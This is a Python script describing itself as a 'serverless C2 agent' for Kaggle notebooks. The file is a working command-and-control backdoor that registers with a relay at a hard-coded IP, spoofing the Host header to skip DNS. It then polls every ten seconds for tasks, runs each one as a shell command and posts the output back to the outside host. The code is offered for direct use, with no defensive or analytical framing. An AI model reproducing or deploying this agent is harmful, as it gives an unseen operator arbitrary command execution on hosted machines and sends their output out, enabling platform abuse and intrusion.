#!/usr/bin/env python3
"""
Serverless C2 Agent for Kaggle - No DNS required
Uses direct IP to webhook.site or similar relay service
"""
import os, sys, json, time, platform, subprocess, threading, requests, hashlib

# Webhook.site relay - IP: 46.4.105.116 (api.webhook.site)
RELAY_IP = "46.4.105.116"
RELAY_HOST = "api.webhook.site"
RELAY_BASE = f"http://{RELAY_IP}/token"

# Your unique token - change this!
TOKEN = "c2-relay-2409"
KERNEL_SLUG = os.environ.get('KAGGLE_KERNEL_SLUG', 'unknown')
AGENT_ID = hashlib.sha256(f"kaggle:{KERNEL_SLUG}".encode()).hexdigest()[:16]

def log(m): print(f"[AGENT {AGENT_ID[:8]}] {m}", flush=True)

def relay_get(endpoint):
    """GET from relay using direct IP with Host header"""
    try:
        url = f"{RELAY_BASE}/{TOKEN}/{endpoint}"
        headers = {"Host": RELAY_HOST, "Content-Type": "application/json"}
        r = requests.get(url, headers=headers, timeout=30)
        return r.json() if r.status_code == 200 else None
    except Exception as e:
        log(f"GET fail: {e}")
        return None

def relay_post(endpoint, data):
    """POST to relay using direct IP with Host header"""
    try:
        url = f"{RELAY_BASE}/{TOKEN}/{endpoint}"
        headers = {"Host": RELAY_HOST, "Content-Type": "application/json"}
        r = requests.post(url, json=data, headers=headers, timeout=30)
        return r.status_code == 200
    except Exception as e:
        log(f"POST fail: {e}")
        return False

def register():
    """Register agent with relay"""
    info = {
        "id": AGENT_ID,
        "hostname": f"kaggle-{KERNEL_SLUG}",
        "platform": "kaggle",
        "os": platform.system(),
        "arch": platform.machine(),
        "ts": time.time()
    }
    if relay_post("register", info):
        log(f"REGISTERED: {AGENT_ID}")
        return True
    log("REG FAILED")
    return False

def beacon():
    """Poll for tasks and execute"""
    while True:
        try:
            # Get tasks from relay
            tasks = relay_get(f"tasks/{AGENT_ID}")
            if tasks:
                for task in tasks:
                    task_id = task.get("id")
                    payload = task.get("payload", "")
                    log(f"TASK: {task_id}")
                    try:
                        # Execute command
                        out = subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")
                        result = {"task_id": task_id, "output": out[:65000], "status": "ok"}
                    except Exception as e:
                        result = {"task_id": task_id, "output": str(e)[:65000], "status": "error"}
                    # Send result back
                    relay_post(f"results/{AGENT_ID}", result)
            # Send heartbeat
            relay_post(f"heartbeat/{AGENT_ID}", {"ts": time.time()})
        except: pass
        time.sleep(10)

# Main
log(f"BOOT {AGENT_ID}")
if register():
    threading.Thread(target=beacon, daemon=True).start()
    log("Beacon started - waiting for commands...")
    # Keep alive
    while True: time.sleep(60)
else:
    log("Exiting - registration failed")
